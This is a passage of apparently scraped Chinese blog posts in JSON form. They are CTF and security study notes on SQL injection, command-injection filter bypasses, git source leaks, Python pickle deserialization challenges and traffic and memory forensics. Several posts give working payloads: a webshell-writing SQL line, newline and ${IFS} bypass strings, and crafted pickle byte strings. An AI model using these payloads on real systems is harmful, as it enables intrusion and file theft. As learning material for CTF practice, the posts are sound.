SSH免密登陆基于口令的验证 基于密钥的验证使用RSA的公钥、私钥机制可以实现ssh免密登录。工作流程：1.client生成公钥，私钥，并且把公钥存储在server的authorized_keys文件里面2.client发送连接请求，发送公钥3.server如果发现client的公钥在authorized_keys文件里面的话，会生成一段随机字符串用公钥加密发送给client4. client收到加密后的字符串后使用私钥解密，然后把解密后的字符串发给server5.server验证字符串是否和发送的相等，相等的话则建立链接。","categories":[],"tags":[{"name":"密码学","slug":"密码学","permalink":"https://polosec.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"}]},{"title":"URL编码解码","slug":"URL编码","date":"2020-03-26T12:29:53.000Z","updated":"2020-03-29T12:46:18.000Z","comments":true,"path":"2020/03/26/URL编码/","link":"","permalink":"https://polosec.github.io/2020/03/26/URL%E7%BC%96%E7%A0%81/","excerpt":"","text":"浮生日记3.26 阴 URL编码参考：https://blog.csdn.net/ljhabc1982/article/details/7094757https://www.cnblogs.com/jerrysion/p/5522673.htmlhttps://www.cnblogs.com/mengff/p/7282488.htmlhttps://blog.csdn.net/danielzhou888/article/details/72861097URL编码概念捞的不谈。只有数字，大小写字母，特定的保留字才不会进行URL编码。 Understanding of Content-Type在HTTP请求和响应投中用Content-Type来表示具体请求中的媒体类型信息。 常见的媒体格式类型如下： text/html ： HTML格式 text/plain ：纯文本格式 text/xml ： XML格式 image/gif ：gif图片格式 image/jpeg ：jpg图片格式 image/png：png图片格式 以application开头的媒体格式类型： application/xhtml+xml ：XHTML格式 application/xml ： XML数据格式 application/atom+xml ：Atom XML聚合格式 application/json ： JSON数据格式 application/pdf ：pdf格式 application/msword ： Word文档格式 application/octet-stream ： 二进制流数据（如常见的文件下载） application/x-www-form-urlencoded ： 中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式） multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式 get/post of form如果enctype为默认的application/x-www-form-urlencoded时：form的method为get时话，则把参数按照?k1=v1&amp;k2=v2的形式拼接到URL的后面直接访问。firn的method为post的话，则把参数放以k1=v1&amp;k2=v2的形式到请求体里面。在有 input type=file 时候，要用multipart/form-data编码方式。浏览器会把表单以控件为单位分割，每个部分使用 –boundary 分割开来，最后一行使用 –boundary– 结尾，并且为每个部分加上Content-Dispositon(form-data或file)、Content-Type(默认text/plain)、name(控件name)等信息，并加上分割符(boundary)。举例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657通过form表单提交文件操作如下：&lt;form method=&quot;post&quot;action=&quot;http://w.sohu.com/t2/upload.do&quot; enctype=”multipart/form-data”&gt; &lt;inputtype=&quot;text&quot; name=&quot;desc&quot;&gt; &lt;inputtype=&quot;file&quot; name=&quot;pic&quot;&gt; &lt;/form&gt; 浏览器将会发送以下数据：POST /t2/upload.do HTTP/1.1User-Agent: SOHUWapRebotAccept-Language: zh-cn,zh;q=0.5Accept-Charset: GBK,utf-8;q=0.7,*;q=0.7Connection: keep-aliveContent-Length: 60408Content-Type:multipart/form-data; boundary=ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXCHost: w.sohu.com --ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXCContent-Disposition: form-data;name=&quot;desc&quot;Content-Type: text/plain; charset=UTF-8Content-Transfer-Encoding: 8bit [......][......][......][......]...........................--ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXCContent-Disposition: form-data;name=&quot;pic&quot;; filename=&quot;photo.jpg&quot;Content-Type: application/octet-streamContent-Transfer-Encoding: binary [图片二进制数据]--ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC-- 对URL编码的理解：在浏览器发送请求前，如果发现传入的参数包括了除保留字和非保留字之外的字符，则需要进行URL编码，然后进行传输。服务器接受到请求后会自动执行一次解码过程。即：客户端发送请求前确保URL符合规范；否则进行URL编码；-&gt;传送到服务端默认进行一次URL解码；然后服务器端进行一次URL编码后发送给客户端-&gt;客户端进行URL解码并显示。那么问题来了。如果我的请求参数中存在特殊符号，那么编码又是什么情况？比如param1=admin+1如果这样直接提交请求的话，浏览器检查通过，直接发送（因为+是保留字，被翻译成空格）在bing搜索123%123 其实搜出来的是123 123下图是输入编码后的数据%2b的情况：下图是直接输入+的情况 保留字符不用于URI分隔符，而是用于其它位置，比如参数的value时，要对这时用到的保留字符做URL编码。比如pa1=admin&amp;pa3 , pa2=123123如果不对value中的保留字进行编码的话，则结果是这样的：pa1=admin&amp;pa3&amp;pa2=123123可能存在安全隐患。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"mysql注入基础&Linux基础","slug":"mysql注入基础","date":"2020-03-26T12:29:53.000Z","updated":"2020-03-29T12:51:07.000Z","comments":true,"path":"2020/03/26/mysql注入基础/","link":"","permalink":"https://polosec.github.io/2020/03/26/mysql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","excerpt":"","text":"致敬https://www.freebuf.com/column/201364.html basic stucture of mysql databasemysql5内置系统数据库IFORMATION_SCHEMA，记录了数据库中所有的数据库名、数据库表名、数据库表字段名。其中的关键表：SCHEMATA，存储数据库名，关键字段：SCHEMA_NAME -&gt;数据库名称例句:select schema_name from INFORMATION_SCHEMA.SCHEMATA; 则查询到的是当前所有数据库的名称。tables:存储表名关键字段：TABLE_SCHEMA -&gt;表示该表名属于哪个数据库名关键字段：TABLE_NAME -&gt;存储表的表名例句 select table_name from INFORMATION_SCHEMA.tables ; //查询所有的表名select table_name from INFORMATION_SCHEMA.tables where table_schema=’dvwa’; //查询dvwa数据库的表名columns:存储列名关键字段：TABLE_SCHEMA -&gt;该字段所属数据库名 关键字段：TABLE_NAME -&gt;存储所属表的名称 关键字段：COLUMN_NAME -&gt;该字段的名称例句： select column_name from INFORMATION_SCHEMA.columns where table_name=’users’ and table_schema=’dvwa’;//查找dvwa数据库中user表中所有字段常用变量Select database() 数据库名称Select VERSION() 数据库版本信息Select @@VERSION 数据库版本信息Select @@GLOBAL.VERSION 数据库版本信user() 系统用户和登录主机名current_user() 当前登录用户和登录主机名system_user() 数据库系统用户账户名称和登录主机名session_user() 当前会话用户名和登录主机名 写一句话select ‘’intooutfile ‘/var/www/html/dvwa/1.php’; //导出一句话木马 判断列数order by n如果order by n报错并且order by n-1返回结果，则列数为n-1 linux命令find(待补充)find / -name ‘fla‘ 查找所有包含fla的文件find / -name flag 查找所有以flag命名的文件-iname选项不区分大小写 空格绕过cat flag.txtcat${IFS}flag.txtcat$IFS$9flag.txtcat&lt;flag.txtcat&lt;&gt;flag.txt lsls -l 列出文件详细信息，如权限 大小 所有者和所属组，修改时间等ls -all / ll 显示隐藏文件、列出文件详细信息，如权限 大小 所有者和所属组，修改时间等-rwxrw-r‐-1 root root 1213 Feb 2 09:39 abc第一个-代表文件，d代表目录,l代表链接。r 读 w写 x执行三段分别对应用户、组、其他的权限。 root root 分别表示用户、用户所在的组 chmodchmod u/g/o +/-/= r/w/x filenamechmod u+x 1.txt 当前user可执行1.txtchmod 755 1.txt 对应权限：rwxr-xr-x","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"wget&curl","slug":"wget-curl","date":"2020-03-23T12:54:28.000Z","updated":"2020-04-21T15:59:27.000Z","comments":true,"path":"2020/03/23/wget-curl/","link":"","permalink":"https://polosec.github.io/2020/03/23/wget-curl/","excerpt":"","text":"致敬https://www.cnblogs.com/duhuo/p/5695256.html curl基本用法下载curl www.baidu.com （默认get方式访问www.baidu.com 并且将html代码回显）curl www.baidu.com &gt;&gt; baidu.html 保存为baidu.htmlcurl -o 2.jpg www.baidu.com/1.jpg 下载1.jpg并保存为2.jpg ftp下载：curl -o -u username:password ftp://www.baidu.com ftp上传curl -T todo.jpg -u username:password ftp://www.baidu.com wgetwget命令用来从指定的URL下载文件。wget非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性，如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。这对从那些限定了链接时间的服务器上下载大文件非常有用。 基本用法wget -i filelist.txt 会下载filelist.txt里面所有的文件。wget -c www.baidu.com/iso.iso 支持断点续传wget -r -np www.baidu.com/pack/ np表示不遍历父目录，nd表示不在本机重新创建目录结构wget -O filename www.baidu.com/1.php 将文件命名为filename并保存","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://polosec.github.io/tags/linux/"}]},{"title":"git快速入门&&git泄露","slug":"git快速入门-git泄露","date":"2020-03-20T15:18:05.000Z","updated":"2020-03-29T12:35:49.000Z","comments":true,"path":"2020/03/20/git快速入门-git泄露/","link":"","permalink":"https://polosec.github.io/2020/03/20/git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8-git%E6%B3%84%E9%9C%B2/","excerpt":"","text":"git学习链接:https://learngitbranching.js.org/https://bingohuang.gitbooks.io/progit2/content/10-git-internals/sections/objects.htmlhttps://zhuanlan.zhihu.com/p/44741777 git泄露原理：通过.git文件夹以及子目录、文件可以还原工程源代码。过程：1.解析.git/index文件，找到工程所有：（文件名，文件sha1）2.去.git/objects/文件夹下载对应的文件3.zlib解压文件，按原始的目录结构写入源代码利用工具：GitHack 利用场景git stash 暂存当前没有完成的工作，当处理完bug后可以通过 git stash pop 将之前没做完的工作合并过来。所以可以通过 git stash pop 弹出之前尚未提交的文件git reset –hard HEAD～1 (或是版本号)意为将版本库回退1个版本，但是不仅仅是将本地版本库的头指针全部重置到指定版本，也会重置暂存区，并且会将工作区代码也回退到这个版本git diff hash 对比当前版本与hash版本提交的区别。git checkout hash 切换到hash版本的提交中。/切换分支git branch -a //show all branches 针对练习练习平台：CTFHUB https://www.ctfhub.com/#/skilltree技能树-web-信息泄露-git","categories":[{"name":"git","slug":"git","permalink":"https://polosec.github.io/categories/git/"}],"tags":[{"name":"git","slug":"git","permalink":"https://polosec.github.io/tags/git/"}]},{"title":"堆叠注入","slug":"堆叠注入","date":"2020-03-17T06:30:29.000Z","updated":"2020-03-17T07:25:22.000Z","comments":true,"path":"2020/03/17/堆叠注入/","link":"","permalink":"https://polosec.github.io/2020/03/17/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/","excerpt":"","text":"基本概念将原来的语句构造完后加上分号，代表该语句结束，后面再输入的就是新的sql语句。 使用条件堆叠注入的使用条件有限。只有当调用数据库函数支持执行多条sql语句时才能够使用，比如php中的mysqli_multi_query()函数。sql=”select * from flag where id=$_POST[‘id’]”;则可构造:1;select * from flag练习题：BUUCTF [SUCTF 2019]EasySQL","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"命令注入绕过&URL解析","slug":"命令注入绕过-URL解析","date":"2020-03-16T12:09:50.000Z","updated":"2020-03-16T14:35:05.000Z","comments":true,"path":"2020/03/16/命令注入绕过-URL解析/","link":"","permalink":"https://polosec.github.io/2020/03/16/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-URL%E8%A7%A3%E6%9E%90/","excerpt":"","text":"题目环境：ctfhub-综合命令注入致敬、参考：回车&amp;换行 题目分析123456789101112131415&lt;?php$res = FALSE;if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123; $ip = $_GET[&#x27;ip&#x27;]; $m = []; if (!preg_match_all(&quot;/(\\||&amp;|;| |\\/|cat|flag|ctfhub)/&quot;, $ip, $m)) &#123; $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;; exec($cmd, $res); &#125; else &#123; $res = $m; &#125;&#125;?&gt; 通过阅读源码发现，过滤了| &amp; ; 空格 / cat flag ctfhub这几个关键字。不绕过的话根本日不进去。接下来考虑绕过首先先ls一下看看里面有啥。想ls，首先要把分隔符绕过了才能ls。这里采用URL编码,即%0a代表换行符。尝试：成功。接下来我们需要做的是查看flag_is_here文件夹有啥。（或许不是文件夹）这里由于过滤了flag字段和空格，所以可以采用fl\\ag这种形式绕过flag，采用${IFS}绕过空格过滤。payload:ip=127.0.0.1%0als${IFS}fl\\ag_is_here之后得到结果flag_5145112918545.php。下一步就应该康康这里面有什么了。假设当前目录为/，我们需要读取/flag_is_here/flag_5145112918545.php文件的内容。继续分析。由于过滤了路径分隔符\\，考虑采用综合命令：先cd进入flag_is_here文件夹，然后cat flag_5145112918545.php文件，当然，针对cat的绕过有很多方法 比如ca\\t 或者直接sort flag_5145112918545.phppayload:ip=127.0.0.1%0acd${IFS}fl\\ag_is_here%0aca\\t${IFS}fl\\ag_5145112918545.php或者把ca\\t换成sort。一样 注意内容：这里换行符需要注意。换行符的URL编码为%0a,采用GET方式。所以需要你直接使用GET方式提交数据，而不能在输入框输入数据。因为在输入框输入数据后，浏览器会自动进行一次urlencode()的过程，会把%0a再次url编码成别的。这就不是我们想要的了。所以可以用hackbar或者burp直接用get方式提交。常见命令注入绕过姿势先看致敬、参考链接中的回车&amp;换行。command1 &amp;&amp; command2 cmd1成功执行后执行cmd2command1 | command2 只执行command2cmd1 || cmd2 cmd1不成功执行则执行cmd2command1 &amp; command2 先执行command2后执行command1空格绕过（以、为分界）：&lt;、&lt;&gt;、${IFS}、$IFS$9$IFS 代表分隔符，$9代表当前系统shell进程中的第九个参数持有者，始终为空字符串。比如：cat ${IFS}filename ===cat $IFS$9filename ===cat filenmae;绕过：首先要知道;代表连续指令，简单地说就是用;可以把多条指令写一行然后分别执行。绕过方法：使用%0a编码绕过。原理：假设原命令为cmd1;cmd2;cmd3\\n使用%0a绕过后：cmd1%0acmd2%0acmd3%0a ==&gt;cmd1\\ncmd2\\ncmd3\\n 注意理解换行符的概念。就知道为什么这样可以绕过了。（粗暴的理解:一个\\n就代表\\n前面的命令执行一次）黑名单字符绕过：a=fl;b=ag;$a$b -&gt;flagcat ca\\t -&gt;cat或者用别的方法。比如可以用sort/head/tail/strings 替换cat#URL解析全过程什么是URL区分URL\\URIURL统一资源定位符，用于互联网上不同的资源的标识，就像不同的人有不同的身份证一样。URL包括协议、域名、路径、参数、查询等。比如：http://polosec.github.io/index.html URL编码规则Url编码通常也被称为百分号编码，编码方式非常简单，使用%百分号加上两位的字符——0123456789ABCDEF——代表一个字节的十六进制形式。Url编码默认使用的字符集是US-ASCII。例如a在US-ASCII码中对应的字节是0x61，那么Url编码之后得到的就是%61，我们在地址栏上输入 http://g.cn/search?q=%61%62%63 ，实际上就等同于在google上搜索abc了。又如@符号在ASCII字符集中对应的字节为0x40，经过Url编码之后得到的是%40。对于非ASCII字符，需要使用ASCII字符集的超集进行编码得到相应的字节，然后对每个字节执行百分号编码。对于Unicode字符，RFC文档建议使用utf-8对其进行编码得到相应的字节，然后对每个字节执行百分号编码。如”中文”使用UTF-8字符集得到的字节为0xE4 0xB8 0xAD 0xE6 0x96 0x87，经过Url编码之后得到”%E4%B8%AD%E6%96%87”。 URL编码/解码时间节点发送请求的时候客户端会自动编码，服务器端接受到请求后会自动解码；然后编码发送给客户端；客户端再解码。关于二次编码/二次解码的问题：二次编码&amp;二次解码用来解决中文编码后乱码的问题 域名解析输入URL按回车后，首先进行的是域名解析操作。首先查看缓存：依次查找浏览器内部缓存、本机hosts文件、本地路由器缓存、然后是ISP提供商的缓存。如果缓存都没有的话，则本地DNS服务器向根域名服务器进行迭代查询，查询到结果后返回给主机。递归查询、迭代查询 进行TCP连接(三次握手)获取到服务器IP地址后，浏览器会以一个随机端口向服务器的80(默认)端口发起TCP连接请求。 客户端发送HTTP请求建立连接后，浏览器发送一个HTTP请求。请求包含请求头和请求正文。请求头一般包括请求方法，资源路径，HTTP协议版本、cookie、host、accept等字段。请求正文则是客户端发送的信息。 服务器响应HTTP请求HTTP响应包括了状态行、响应头、响应正文。状态行标识了http协议版本与状态码。响应头包含了一些字段。比如set-cookie,date,allow,content-encoding等字段。以K:V形式出现。 浏览器显示html页面1.加载解析HTML，开始构建DOM树。2.遇到CSS外链，异步加载解析CSS，构建CSS规则树。3.遇到script标签，如果是普通JS标签则同步加载并执行，阻塞页面渲染，如果标签上有defer/async属性则异步加载JS资源。设置defer的JS资源会在DOMContentLoaded事件之前执行；设置了async的JS资源加载完就执行。4.合并DOM树和CSS规则树生成render树。5.布局render树，计算各元素的尺寸、位置等，在内存上生成Bitmap。6.渲染render树，将内存上的Bitmap绘制到屏幕上。 页面加载完成","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"buu登录流量分析","slug":"buu登录流量分析","date":"2020-03-14T14:21:56.000Z","updated":"2020-03-14T14:25:19.000Z","comments":true,"path":"2020/03/14/buu登录流量分析/","link":"","permalink":"https://polosec.github.io/2020/03/14/buu%E7%99%BB%E5%BD%95%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","excerpt":"","text":"预备知识：wireshark基本操作题目分析：黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案) 注意：得到的 flag 请包上 flag{} 提交打开数据包首先考虑登录页面，往下稍微翻了一下就看到了一个意思登录页面（编号20） 是向user.php提交数据，盲猜登陆界面。然后追踪流-TCP流，即可看到密码。 这应该是第一道秒的题 太菜了。","categories":[{"name":"wp","slug":"wp","permalink":"https://polosec.github.io/categories/wp/"}],"tags":[{"name":"buu","slug":"buu","permalink":"https://polosec.github.io/tags/buu/"},{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"}]},{"title":"python pickle反序列化初步学习","slug":"python-pickle反序列化初步学习","date":"2020-03-12T10:41:38.000Z","updated":"2020-03-12T12:16:59.000Z","comments":true,"path":"2020/03/12/python-pickle反序列化初步学习/","link":"","permalink":"https://polosec.github.io/2020/03/12/python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"预备知识：python、pickle、stack、面向对象基础致敬：从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势注意：此篇文章需先通读文章链接中的一些基础概念，否则理解起来可能存在困难，在对例题进行讲解的过程中不会过多阐述基础概念。 BB几句其实之前没怎么接触过python pickle模块的反序列化，或者说没接触过反序列化，这次”高校抗疫”CTF线上赛给我上了一课。有一道webtmp的题目，是与python pickle模块的反序列化有关，我也找到了非常详细的解析(致敬部分已贴出)，但是没有沉下心认真地去一步步地做，所以这道题也没有做出来，其实这道题不难，做出来的师傅还是很多的。相反，内存取证的一道题我根据教程一步步做出来了，也可能是之前web没做出来过题导致了这个结果。还需努力！ 相关概念建议通读 致敬文章。需要明确的概念：数据结构–栈。python数据类型：list、tuple、dict Python中list（列表）、dict（字典）、tuple（元组）、set（集合）详细介绍pickle、pickletools ：详见致敬部分链接。 题目分析第一题：题目链接：HITCTF题目源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import base64import picklefrom flask import Flask, Response, render_template, requestimport pickletools,sysapp = Flask(__name__)class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f&#x27;Animal(name=&#123;self.name!r&#125;, category=&#123;self.category!r&#125;)&#x27; def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.categorydef read(filename, encoding=&#x27;utf-8&#x27;): with open(filename, &#x27;r&#x27;, encoding=encoding) as fin: return fin.read()@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def index(): if request.args.get(&#x27;source&#x27;): return Response(read(__file__), mimetype=&#x27;text/plain&#x27;) if request.method == &#x27;POST&#x27;: try: pickle_data = request.form.get(&#x27;data&#x27;) if b&#x27;R&#x27; in base64.b64decode(pickle_data): return &#x27;No... I don\\&#x27;t like R-things. No Rabits, Rats, Roosters or RCEs.&#x27; else: result = pickle.loads(base64.b64decode(pickle_data)) if type(result) is not Animal: return &#x27;Are you sure that is an animal???&#x27; correct = (result == Animal(favorite.name, favorite.category)) return render_template(&#x27;unpickle_result.html&#x27;, result=result, pickle_data=pickle_data, giveflag=correct) except Exception as e: return &#x27;something wrong...&#x27; sample_obj = Animal(&#x27;kitty&#x27;, &#x27;cat&#x27;) pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode() return render_template(&#x27;unpickle_page.html&#x27;, sample_obj=sample_obj, pickle_data=pickle_data)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=5000) 题目的要求是,传入一个经过base64加密的pickle序列化后的字符串，在服务器端对该字符串进行解析，如果不包含R指令码并且解析后的对象类型为Animal，并且与其规定的favorite对象的name与category属性都一样的话，则可获得flag。对代码进行审计，观察第34行，过滤了R指令码，即堵上了RCE这条路。继续分析，发现并没有重写find_class方法，即可以通过引入favorite.name 和favorite.category的方法通过判定。即： 123o1=Animal()o1.name=favorite.nameo1.category=favorite.category 这样构造的对象可以保证通过**correct = (result == Animal(favorite.name, favorite.category))**这句代码的判定。接下来的问题是构造这种对象。通过对指令码的学习，我们可以构造出这种对象。首先构造正常的animal对象。 1234567891011121314151617181920212223242526import pickle,pickletoolso1=Animal(&#x27;xx&#x27;,&#x27;yy&#x27;)normal=pickle.dumps(o1)#这是正常animal经序列化后的数据,ser=b&#x27;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x02\\x00\\x00\\x00xxq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x02\\x00\\x00\\x00yyq\\x06ub.&#x27;#这是序列化之后的数据（字符串形式）其实就是normal，我把它打印出来了。pickletools.dis(normal)#下面为pickletools.dis(normal)的结果0: \\x80 PROTO 3 2: c GLOBAL &#x27;__main__ Animal&#x27; 19: q BINPUT 0 21: ) EMPTY_TUPLE 22: \\x81 NEWOBJ 23: q BINPUT 1 25: &#125; EMPTY_DICT 26: q BINPUT 2 28: ( MARK 29: X BINUNICODE &#x27;name&#x27; 38: q BINPUT 3 40: X BINUNICODE &#x27;xx&#x27; 47: q BINPUT 4 49: X BINUNICODE &#x27;category&#x27; 62: q BINPUT 5 64: X BINUNICODE &#x27;yy&#x27; 71: q BINPUT 6 73: u SETITEMS (MARK at 28) 74: b BUILD 75: . STOP 根据思路，只需要把40 64标号处的值替换为favorite.name、favorite.category即可。方法：使用c(global)指令引入我们所需的数据。即把’xx’ 通过c指令换成favorite.name，’yy’换成favorite.category实现：把ser中xx与yy的编码使用golbal favorite.xx替换。 1payload=b&#x27;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03cfavorite\\nname\\nq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05cfavorite\\ncategory\\nq\\x06ub.&#x27; Then,encode it! 1print(base64.b64encode(payload)) 最终结果:gANjX19tYWluX18KQW5pbWFsCnEAKYFxAX1xAihYBAAAAG5hbWVxA2NmYXZvcml0ZQpuYW1lCnEEWAgAAABjYXRlZ29yeXEFY2Zhdm9yaXRlCmNhdGVnb3J5CnEGdWIu 第二题题目链接：HITCTF题目源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import base64import ioimport sysimport picklefrom flask import Flask, Response, render_template, requestimport favoriteapp = Flask(__name__)class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f&#x27;Animal(name=&#123;self.name!r&#125;, category=&#123;self.category!r&#125;)&#x27; def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.categoryclass RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == &#x27;__main__&#x27;: return getattr(sys.modules[&#x27;__main__&#x27;], name) raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load()def read(filename, encoding=&#x27;utf-8&#x27;): with open(filename, &#x27;r&#x27;, encoding=encoding) as fin: return fin.read()@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def index(): if request.args.get(&#x27;source&#x27;): return Response(read(__file__), mimetype=&#x27;text/plain&#x27;) if request.method == &#x27;POST&#x27;: try: pickle_data = request.form.get(&#x27;data&#x27;) if b&#x27;R&#x27; in base64.b64decode(pickle_data): return &#x27;No... I don\\&#x27;t like R-things. No Rabits, Rats, Roosters or RCEs.&#x27; else: result = restricted_loads(base64.b64decode(pickle_data)) if type(result) is not Animal: return &#x27;Are you sure that is an animal???&#x27; correct = (result == Animal(favorite.name, favorite.category)) return render_template(&#x27;unpickle_result.html&#x27;, result=result, pickle_data=pickle_data, giveflag=correct) except Exception as e: print(repr(e)) return &quot;Something wrong&quot; sample_obj = Animal(&#x27;kitty&#x27;, &#x27;cat&#x27;) pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode() return render_template(&#x27;unpickle_page.html&#x27;, sample_obj=sample_obj, pickle_data=pickle_data)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=5000) 题目分析：相比上一个题，该题多了一个find_class方法的重写。规定了module只能是main中的，所以就无法引入favorite了。解题思路：通过__main__.blue引入这一个module，由于命名空间还在main内，故不会被拦截。然后修改当前引入对象的属性，自定义即可。然后把这个对象弹出，再压入一个正常的animal对象。注意：该正常对象的属性值须与你刚才设定的属性值相同。payload=b’\\x80\\x03c__main__\\nfavorite\\n}(X\\x04\\x00\\x00\\x00nameX\\x02\\x00\\x00\\x00xxX\\x08\\x00\\x00\\x00categoryX\\x02\\x00\\x00\\x00yyub0c__main__\\nAnimal\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x02\\x00\\x00\\x00xxX\\x08\\x00\\x00\\x00categoryX\\x02\\x00\\x00\\x00yyub.’经过base64加密后提交即可。 总结这类问题只能说初步了解，具体还有很多细节没有弄明白。还需要进一步学习。最后一道题的payload在写完favorite\\n后压入一个空dict后，把当前栈这个整体，作为一个list，压进前序栈（opcode: (（ 也就是MARK操作符））。之后的操作就是更新favorite.name 和favorite.category分别为xx 和yy。对应X\\x04\\x00\\x00\\x00nameX\\x02\\x00\\x00\\x00xxX\\x08\\x00\\x00\\x00categoryX\\x02\\x00\\x00\\x00yy。然后u就是形成键值对，b-build，把当前键值对的值给前序栈中的对象。这样前半部分的操作就完成了。对该对象修改完之后直接弹出(opcode : 0)，不管他了，然后再插一个正经对象，属性值一样就OK。","categories":[{"name":"web基础","slug":"web基础","permalink":"https://polosec.github.io/categories/web%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"三条命令","slug":"三条命令","date":"2020-03-09T13:53:48.000Z","updated":"2020-03-09T14:15:19.000Z","comments":true,"path":"2020/03/09/三条命令/","link":"","permalink":"https://polosec.github.io/2020/03/09/%E4%B8%89%E6%9D%A1%E5%91%BD%E4%BB%A4/","excerpt":"","text":"预备知识 wireshark、SYN、TCP、HTTP参考、致敬:WireShark教程 – 黑客发现之旅(5) – (nmap)扫描探测 文件分析那到手的文件啥也不是，文件名zip，考虑压缩文件。解压后得到一数据包，用wireshark打开 数据包分析常规追踪了一下TCP流、HTTP流、导出对象，并没有什么收获。接下来分析题目，说是扫描端口，结合HTTP导出对象中的nmap字样，猜测是NMAP扫描。结合参考中的链接，可以推测扫描方式为全连接扫描。通过对特征字段的分析，发现端口存在的数据包返回的TSecr字段的值不为0，则可以根据此找出开放的端口。按ctrl+f弹出上方搜索框，选择字符串，搜索TSecr=4799。 题目总结这道题其实不太难，懂得扫描方式可以把这题秒了，但是我8太懂，还是现百度的。事实证明考高分没用，重要的是实践！","categories":[{"name":"wp","slug":"wp","permalink":"https://polosec.github.io/categories/wp/"}],"tags":[{"name":"buu","slug":"buu","permalink":"https://polosec.github.io/tags/buu/"},{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"}]},{"title":"usb&内存取证","slug":"usb-内存取证","date":"2020-03-09T12:46:06.000Z","updated":"2020-03-28T09:13:38.000Z","comments":true,"path":"2020/03/09/usb-内存取证/","link":"","permalink":"https://polosec.github.io/2020/03/09/usb-%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/","excerpt":"","text":"预备知识：wireshark流量分析、binwalk、内存取证、USB、volatility 、strings、grep参考、致敬：CTF 内存取证 USB流量分析 附件分析拿到附件后，只有一个数据包文件。不用想，直接用wireshark打开分析一波。##文件分析这玩意确实挺大的，首先考虑包含了文件，使用kali linux 下的工具binwalk分析一波。但是binwalk出来的附件在解压时都损坏了，此路不通。继续分析我们的流量包，追踪http协议。发现了巨大的包，可能有附件，于是在wireshark中导出http对象。（左上角文件-导出对象-http）接下来观察导出的文件有两个一样的较大的php文件，考虑文件包含。再次丢到binwalk里面分析一波。果不其然，分离出了data.vmem文件。可以理解为vmem文件保存了当时内存中的数据，以支持在虚拟机中的暂停功能。接下来用内存分析工具volatility 分析data.vmem使用方法： volatility -f filename imageinfo //查看镜像信息。通过imageinfo 可以确定，镜像为WinXPSP2x86或者WinXPSP3x86.（影响不大）接下来使用命令 volatility -f data.vmem –profile=WinXPSP2x86 filescan 扫描内存中的文件可以看到有一堆文件。由于是ctf比赛，尝试过滤文件：比赛名称xctf或者flag 即volatility -f data.vmem –profile=WinXPSP2x86 filescan |grep flagvolatility -f data.vmem –profile=WinXPSP2x86 filescan |grep xctf]通过过滤flag 我们找到了flag.img文件。 DUMP IT!接下来需要做的事将flag.img 导出。使用命令 volatility -f data.vmem –profile=WinXPSP2x86 dumpfiles -Q 0x0000000001155f90 -D 